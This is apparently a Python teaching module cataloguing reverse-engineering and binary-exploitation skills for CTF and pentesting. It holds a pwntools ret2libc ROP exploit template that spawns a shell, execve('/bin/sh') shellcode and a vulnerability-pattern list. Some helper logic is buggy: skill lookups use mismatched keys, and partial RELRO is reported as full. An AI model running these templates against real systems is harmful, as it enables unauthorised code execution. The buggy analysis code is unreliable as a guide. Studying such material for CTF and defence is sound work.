"""
reverse_engineering.py — Reverse Engineering & Binary Exploitation Skills
========================================================================
10 core RE skills for CTF and pentesting.
Based on: Ghidra, IDA Pro, Radare2, pwntools, angr, binwalk
"""

from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum


class RECategory(Enum):
    STATIC_ANALYSIS = "static_analysis"
    DYNAMIC_ANALYSIS = "dynamic_analysis"
    BINARY_EXPLOITATION = "binary_exploitation"
    MALWARE_ANALYSIS = "malware_analysis"
    PROTOCOL_REVERSING = "protocol_reversing"
    ANTI_REVERSING = "anti_reversing"


@dataclass
class RESkill:
    """Reverse Engineering skill definition."""
    name: str
    category: RECategory
    description: str
    tools: List[str]
    techniques: List[str]
    difficulty: str  # beginner, intermediate, advanced, expert
    use_cases: List[str]
    code_patterns: List[str]


class ReverseEngineeringEngine:
    """
    Engine for reverse engineering and binary exploitation.
    10 core skills for CTF and pentesting.
    """
    
    def __init__(self):
        self.skills = self._load_skills()
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.exploitation_techniques = self._load_exploitation_techniques()
    
    def _load_skills(self) -> Dict[str, RESkill]:
        """Load 10 core RE skills."""
        return {
            "1_disassembly": RESkill(
                name="Disassembly & Decompilation",
                category=RECategory.STATIC_ANALYSIS,
                description="Convert binary to assembly/high-level code",
                tools=["Ghidra", "IDA Pro", "Radare2", "Binary Ninja", "Capstone"],
                techniques=[
                    "Control flow graph analysis",
                    "Function identification",
                    "String extraction",
                    "Cross-reference analysis",
                    "Symbol recovery"
                ],
                difficulty="intermediate",
                use_cases=[
                    "Understanding program logic",
                    "Finding vulnerabilities",
                    "Analyzing malware",
                    "Cracking software"
                ],
                code_patterns=[
                    "main:",  # Function entry
                    "call",   # Function call
                    "jmp",    # Jump
                    "je/jne", # Conditional jump
                    "ret",    # Return
                    "push/pop", # Stack operations
                ]
            ),
            
            "2_debugging": RESkill(
                name="Dynamic Analysis & Debugging",
                category=RECategory.DYNAMIC_ANALYSIS,
                description="Runtime analysis with breakpoints and tracing",
                tools=["GDB", "WinDbg", "x64dbg", "LLDB", "Frida"],
                techniques=[
                    "Breakpoint setting",
                    "Memory inspection",
                    "Register analysis",
                    "Stack unwinding",
                    "Hook injection"
                ],
                difficulty="intermediate",
                use_cases=[
                    "Understanding runtime behavior",
                    "Bypassing anti-debugging",
                    "Extracting encryption keys",
                    "Analyzing packed malware"
                ],
                code_patterns=[
                    "break *0x12345678",  # GDB breakpoint
                    "x/10x $esp",        # Examine memory
                    "info registers",    # Register dump
                    "stepi",             # Step instruction
                    "continue",          # Continue execution
                ]
            ),
            
            "3_buffer_overflow": RESkill(
                name="Buffer Overflow Exploitation",
                category=RECategory.BINARY_EXPLOITATION,
                description="Stack-based and heap-based buffer overflows",
                tools=["pwntools", "Ropper", "ROPgadget", "one_gadget"],
                techniques=[
                    "Stack smashing",
                    "Return-to-libc",
                    "ROP chains",
                    "Heap overflow",
                    "Format string bugs"
                ],
                difficulty="advanced",
                use_cases=[
                    "Remote code execution",
                    "Privilege escalation",
                    "CTF binary challenges",
                    "Exploit development"
                ],
                code_patterns=[
                    "A" * 256,  # Padding
                    "jmp esp",  # Jump to shellcode
                    "system",   # libc system call
                    "/bin/sh",  # Shell string
                    "pop rdi; ret",  # ROP gadget
                ]
            ),
            
            "4_shellcode": RESkill(
                name="Shellcode Development",
                category=RECategory.BINARY_EXPLOITATION,
                description="Writing custom shellcode for exploitation",
                tools=["nasm", "gcc", "pwntools", "msfvenom"],
                techniques=[
                    "Position-independent code",
                    "Null-byte avoidance",
                    "Egg hunters",
                    "Staged shellcode",
                    "Alphanumeric shellcode"
                ],
                difficulty="advanced",
                use_cases=[
                    "Custom payloads",
                    "Restricted character sets",
                    "Evasion techniques",
                    "CTF challenges"
                ],
                code_patterns=[
                    "\\x31\\xc0",  # xor eax, eax
                    "\\x50",       # push eax
                    "\\x68\\x2f\\x2f\\x73\\x68",  # push "//sh"
                    "\\x68\\x2f\\x62\\x69\\x6e",  # push "/bin"
                    "\\x89\\xe3",  # mov ebx, esp
                    "\\xcd\\x80",  # int 0x80
                ]
            ),
            
            "5_rop": RESkill(
                name="Return-Oriented Programming (ROP)",
                category=RECategory.BINARY_EXPLOITATION,
                description="Chaining existing code gadgets to bypass DEP/NX",
                tools=["ROPgadget", "Ropper", "ropper", "pwntools"],
                techniques=[
                    "Gadget discovery",
                    "ROP chain construction",
                    "ret2libc",
                    "ret2csu",
                    "Stack pivoting"
                ],
                difficulty="expert",
                use_cases=[
                    "Bypassing DEP/NX",
                    "Bypassing ASLR",
                    "Complex exploitation",
                    "Kernel exploitation"
                ],
                code_patterns=[
                    "pop rdi; ret",  # Common gadget
                    "pop rsi; pop r15; ret",
                    "ret2csu_init",
                    "__libc_csu_init",
                    "syscall; ret",
                ]
            ),
            
            "6_heap_exploitation": RESkill(
                name="Heap Exploitation",
                category=RECategory.BINARY_EXPLOITATION,
                description="Heap metadata corruption and use-after-free",
                tools=["pwntools", "GDB + pwndbg", "HeapLAB"],
                techniques=[
                    "Use-after-free",
                    "Double-free",
                    "Heap overflow",
                    "House of force",
                    "House of spirit",
                    "Tcache poisoning"
                ],
                difficulty="expert",
                use_cases=[
                    "Modern binary exploitation",
                    "Browser exploitation",
                    "Kernel heap exploitation",
                    "CTF heap challenges"
                ],
                code_patterns=[
                    "malloc",
                    "free",
                    "tcache",
                    "fastbin",
                    "unsorted bin",
                    "large bin",
                ]
            ),
            
            "7_anti_reversing": RESkill(
                name="Anti-Reversing & Obfuscation",
                category=RECategory.ANTI_REVERSING,
                description="Bypassing anti-debugging and obfuscation",
                tools=["Scylla", "x64dbg", "Frida", "de4dot"],
                techniques=[
                    "Anti-debugging bypass",
                    "Anti-VM bypass",
                    "Packer unpacking",
                    "Obfuscation deobfuscation",
                    "Code virtualization bypass"
                ],
                difficulty="advanced",
                use_cases=[
                    "Malware analysis",
                    "Software cracking",
                    "DRM bypass",
                    "CTF reversing challenges"
                ],
                code_patterns=[
                    "IsDebuggerPresent",
                    "NtQueryInformationProcess",
                    "rdtsc",  # Timing check
                    "cpuid",  # VM detection
                    "int 2d",  # Anti-debug
                ]
            ),
            
            "8_malware_analysis": RESkill(
                name="Malware Analysis",
                category=RECategory.MALWARE_ANALYSIS,
                description="Analyzing malicious software behavior",
                tools=["Ghidra", "IDA Pro", "YARA", "Cuckoo Sandbox", "VirusTotal"],
                techniques=[
                    "Static analysis",
                    "Dynamic analysis",
                    "Behavioral analysis",
                    "Network analysis",
                    "Memory forensics"
                ],
                difficulty="intermediate",
                use_cases=[
                    "Incident response",
                    "Threat intelligence",
                    "Malware classification",
                    "IOC extraction"
                ],
                code_patterns=[
                    "CreateRemoteThread",
                    "VirtualAllocEx",
                    "WriteProcessMemory",
                    "InternetOpenUrl",
                    "RegSetValueEx",
                ]
            ),
            
            "9_protocol_reversing": RESkill(
                name="Protocol Reversing",
                category=RECategory.PROTOCOL_REVERSING,
                description="Reverse engineering network protocols",
                tools=["Wireshark", "tcpdump", "Scapy", "Protocol Buffers"],
                techniques=[
                    "Packet capture analysis",
                    "Protocol dissection",
                    "State machine reconstruction",
                    "Fuzzing",
                    "Man-in-the-middle"
                ],
                difficulty="intermediate",
                use_cases=[
                    "IoT security",
                    "Game hacking",
                    "API reverse engineering",
                    "Proprietary protocol analysis"
                ],
                code_patterns=[
                    "struct.pack",  # Python struct
                    "socket.send",
                    "b'\\x00\\x01\\x02'",  # Raw bytes
                    "CRC32",
                    "XOR encryption",
                ]
            ),
            
            "10_kernel_exploitation": RESkill(
                name="Kernel Exploitation",
                category=RECategory.BINARY_EXPLOITATION,
                description="Exploiting kernel vulnerabilities",
                tools=["GDB + QEMU", "exploit-db", "pwntools"],
                techniques=[
                    "Kernel module exploitation",
                    "Syscall exploitation",
                    "Race conditions",
                    "Stack overflow in kernel",
                    "Use-after-free in kernel"
                ],
                difficulty="expert",
                use_cases=[
                    "Privilege escalation",
                    "Container escape",
                    "Sandbox escape",
                    "Rootkit development"
                ],
                code_patterns=[
                    "commit_creds",
                    "prepare_kernel_cred",
                    "swapgs",
                    "iretq",
                    "user_cs; user_ss",
                ]
            )
        }
    
    def _load_vulnerability_patterns(self) -> Dict:
        """Load common vulnerability patterns for RE."""
        return {
            "buffer_overflow": {
                "patterns": [
                    "strcpy",
                    "strcat",
                    "gets",
                    "sprintf",
                    "scanf",
                ],
                "description": "Unbounded string operations",
                "severity": "CRITICAL"
            },
            "format_string": {
                "patterns": [
                    "printf(user_input)",
                    "fprintf(stderr, user_input)",
                    "sprintf(buf, user_input)",
                ],
                "description": "User-controlled format string",
                "severity": "HIGH"
            },
            "use_after_free": {
                "patterns": [
                    "free(ptr); ... use(ptr)",
                    "delete obj; ... obj->method()",
                ],
                "description": "Memory use after deallocation",
                "severity": "HIGH"
            },
            "integer_overflow": {
                "patterns": [
                    "malloc(user_size * 4)",
                    "int len = user_input + 100",
                ],
                "description": "Integer overflow in size calculation",
                "severity": "MEDIUM"
            },
            "race_condition": {
                "patterns": [
                    "TOCTOU",
                    "check then use",
                    "non-atomic operations",
                ],
                "description": "Time-of-check to time-of-use",
                "severity": "MEDIUM"
            }
        }
    
    def _load_exploitation_techniques(self) -> Dict:
        """Load exploitation techniques."""
        return {
            "ret2libc": {
                "description": "Return to libc functions",
                "bypasses": ["DEP", "NX"],
                "requirements": ["libc base address", "system() offset"]
            },
            "ret2plt": {
                "description": "Return to PLT entries",
                "bypasses": ["ASLR (partial)"],
                "requirements": ["PLT entries available"]
            },
            "sigreturn": {
                "description": "Sigreturn-oriented programming",
                "bypasses": ["DEP", "NX", "ASLR"],
                "requirements": ["sigreturn gadget"]
            },
            "jop": {
                "description": "Jump-oriented programming",
                "bypasses": ["CFI"],
                "requirements": ["dispatcher gadget"]
            },
            "cop": {
                "description": "Call-oriented programming",
                "bypasses": ["CFI"],
                "requirements": ["call gadgets"]
            }
        }
    
    def analyze_binary(self, binary_info: Dict) -> Dict:
        """
        Analyze binary for RE opportunities.
        """
        results = {
            "architecture": binary_info.get("arch", "unknown"),
            "protections": [],
            "vulnerabilities": [],
            "recommended_skills": [],
            "exploitation_path": []
        }
        
        # Check protections
        if binary_info.get("nx", False):
            results["protections"].append("NX (No-Execute)")
        if binary_info.get("aslr", False):
            results["protections"].append("ASLR")
        if binary_info.get("pie", False):
            results["protections"].append("PIE")
        if binary_info.get("canary", False):
            results["protections"].append("Stack Canary")
        if binary_info.get("relro", False):
            results["protections"].append("Full RELRO")
        
        # Recommend skills based on protections
        if not binary_info.get("nx", False):
            results["recommended_skills"].append("shellcode")
            results["exploitation_path"].append("Direct shellcode injection")
        
        if binary_info.get("nx", False) and not binary_info.get("aslr", False):
            results["recommended_skills"].append("rop")
            results["exploitation_path"].append("ROP chain with known addresses")
        
        if binary_info.get("aslr", False):
            results["recommended_skills"].append("ret2libc")
            results["exploitation_path"].append("Leak libc address then ret2libc")
        
        # Check for vulnerabilities in imports
        dangerous_funcs = ["strcpy", "gets", "scanf", "sprintf"]
        imports = binary_info.get("imports", [])
        for func in dangerous_funcs:
            if func in imports:
                results["vulnerabilities"].append({
                    "type": "buffer_overflow",
                    "function": func,
                    "severity": "CRITICAL"
                })
        
        return results
    
    def get_skill(self, skill_name: str) -> Optional[RESkill]:
        """Get specific RE skill."""
        return self.skills.get(skill_name)
    
    def get_skills_by_category(self, category: RECategory) -> List[RESkill]:
        """Get all skills in category."""
        return [s for s in self.skills.values() if s.category == category]
    
    def get_skills_by_difficulty(self, difficulty: str) -> List[RESkill]:
        """Get all skills by difficulty."""
        return [s for s in self.skills.values() if s.difficulty == difficulty]
    
    def recommend_exploitation_path(self, binary_info: Dict) -> List[str]:
        """
        Recommend exploitation path based on binary analysis.
        """
        analysis = self.analyze_binary(binary_info)
        
        path = []
        
        # Step 1: Identify protections
        path.append("1. Identify protections:")
        for prot in analysis["protections"]:
            path.append(f"   - {prot}")
        
        # Step 2: Find vulnerabilities
        path.append("2. Find vulnerabilities:")
        for vuln in analysis["vulnerabilities"]:
            path.append(f"   - {vuln['type']} via {vuln['function']}")
        
        # Step 3: Recommended skills
        path.append("3. Required skills:")
        for skill in analysis["recommended_skills"]:
            skill_info = self.get_skill(skill)
            if skill_info:
                path.append(f"   - {skill_info.name} ({skill_info.difficulty})")
        
        # Step 4: Exploitation path
        path.append("4. Exploitation path:")
        for step in analysis["exploitation_path"]:
            path.append(f"   - {step}")
        
        return path
    
    def generate_rop_chain_template(self, arch: str = "x86_64") -> str:
        """Generate ROP chain template."""
        if arch == "x86_64":
            return """
# ROP Chain Template (x86_64)
from pwn import *

# Setup
elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

# Gadgets (find with ROPgadget)
pop_rdi = 0x401234  # pop rdi; ret
pop_rsi = 0x401235  # pop rsi; ret
pop_rdx = 0x401236  # pop rdx; ret
ret = 0x401237      # ret

# Leak libc address
payload = b'A' * 72  # Padding to RIP
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)
p.recvuntil(b'\\n')
leaked = u64(p.recv(6).ljust(8, b'\\x00'))
libc.address = leaked - libc.symbols['puts']

# Shell
payload = b'A' * 72
payload += p64(ret)  # Stack alignment
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.interactive()
"""
        else:
            return "# ROP chain template for x86_32"
    
    def generate_shellcode_template(self, arch: str = "x86_64", os: str = "linux") -> str:
        """Generate shellcode template."""
        if arch == "x86_64" and os == "linux":
            return """
# Linux x86_64 Shellcode - execve("/bin/sh")
# Compile: nasm -f bin shellcode.asm

section .text
global _start

_start:
    ; Clear registers
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    ; Push "/bin/sh" string
    push rax
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp

    ; execve syscall
    push 59         ; syscall number
    pop rax
    syscall
"""
        else:
            return "# Shellcode template for this architecture"


# Pentesting integration
class PentestFramework:
    """
    Pentesting framework integrating RE skills.
    """
    
    def __init__(self):
        self.re_engine = ReverseEngineeringEngine()
        self.test_cases = self._load_test_cases()
    
    def _load_test_cases(self) -> Dict:
        """Load pentesting test cases."""
        return {
            "buffer_overflow": {
                "steps": [
                    "1. Fuzz input to find crash point",
                    "2. Control RIP/EIP",
                    "3. Check protections (NX, ASLR, canary)",
                    "4. Develop exploit (shellcode/ROP/ret2libc)",
                    "5. Test exploit locally",
                    "6. Adapt for remote target"
                ],
                "tools": ["pwntools", "GDB", "ROPgadget", "msfvenom"]
            },
            "web_app": {
                "steps": [
                    "1. Reconnaissance (nmap, dirb, nikto)",
                    "2. Vulnerability scanning (Burp, sqlmap)",
                    "3. Exploitation (SQLi, XSS, SSRF)",
                    "4. Post-exploitation (privesc, lateral movement)",
                    "5. Reporting"
                ],
                "tools": ["Burp Suite", "sqlmap", "nikto", "metasploit"]
            },
            "malware_analysis": {
                "steps": [
                    "1. Static analysis (strings, imports)",
                    "2. Dynamic analysis (sandbox)",
                    "3. Behavioral analysis (API calls)",
                    "4. Network analysis (C2 communication)",
                    "5. IOC extraction"
                ],
                "tools": ["Ghidra", "x64dbg", "Wireshark", "YARA"]
            }
        }
    
    def run_pentest(self, target_type: str, target_info: Dict) -> Dict:
        """
        Run pentest based on target type.
        """
        if target_type == "binary":
            return self._pentest_binary(target_info)
        elif target_type == "web":
            return self._pentest_web(target_info)
        elif target_type == "network":
            return self._pentest_network(target_info)
        else:
            return {"error": f"Unknown target type: {target_type}"}
    
    def _pentest_binary(self, target_info: Dict) -> Dict:
        """Pentest binary target."""
        analysis = self.re_engine.analyze_binary(target_info)
        
        return {
            "target": target_info.get("name", "unknown"),
            "type": "binary",
            "analysis": analysis,
            "recommendations": self.re_engine.recommend_exploitation_path(target_info),
            "test_cases": self.test_cases.get("buffer_overflow", {})
        }
    
    def _pentest_web(self, target_info: Dict) -> Dict:
        """Pentest web target."""
        return {
            "target": target_info.get("url", "unknown"),
            "type": "web",
            "test_cases": self.test_cases.get("web_app", {})
        }
    
    def _pentest_network(self, target_info: Dict) -> Dict:
        """Pentest network target."""
        return {
            "target": target_info.get("ip", "unknown"),
            "type": "network",
            "test_cases": self.test_cases.get("network", {})
        }


if __name__ == "__main__":
    # Test the RE engine
    engine = ReverseEngineeringEngine()
    
    print("=" * 60)
    print("REVERSE ENGINEERING SKILLS")
    print("=" * 60)
    
    for name, skill in engine.skills.items():
        print(f"\n{name}: {skill.name}")
        print(f"  Category: {skill.category.value}")
        print(f"  Difficulty: {skill.difficulty}")
        print(f"  Tools: {', '.join(skill.tools[:3])}")
    
    print("\n" + "=" * 60)
    print("EXPLOITATION RECOMMENDATIONS")
    print("=" * 60)
    
    # Test binary analysis
    binary_info = {
        "arch": "x86_64",
        "nx": True,
        "aslr": True,
        "pie": False,
        "canary": False,
        "relro": "partial",
        "imports": ["puts", "printf", "strcpy", "system"]
    }
    
    recommendations = engine.recommend_exploitation_path(binary_info)
    for line in recommendations:
        print(line)
